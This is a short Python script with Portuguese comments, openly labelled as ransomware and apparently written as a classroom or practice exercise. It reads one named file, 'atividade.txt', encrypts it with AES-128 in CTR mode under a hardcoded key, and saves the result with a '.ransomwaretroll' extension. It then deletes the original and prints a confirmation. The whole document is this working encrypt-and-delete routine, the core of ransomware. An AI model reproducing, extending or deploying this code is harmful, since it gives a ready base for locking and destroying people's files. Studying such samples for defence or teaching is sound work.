import os
import pyaes

# Nome do arquivo alvo
file_name = "atividade.txt"
new_file_name = file_name + ".ransomwaretroll"

# Abrir o arquivo original
with open(file_name, "rb") as file:
    file_data = file.read()

# Chave de criptografia (deve ter 16 bytes para AES-128)
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

# Criar o novo arquivo criptografado
with open(new_file_name, "wb") as new_file:
    new_file.write(crypto_data)

# Remover o arquivo original
os.remove(file_name)
print(f"[+] Arquivo criptografado: {new_file_name}")
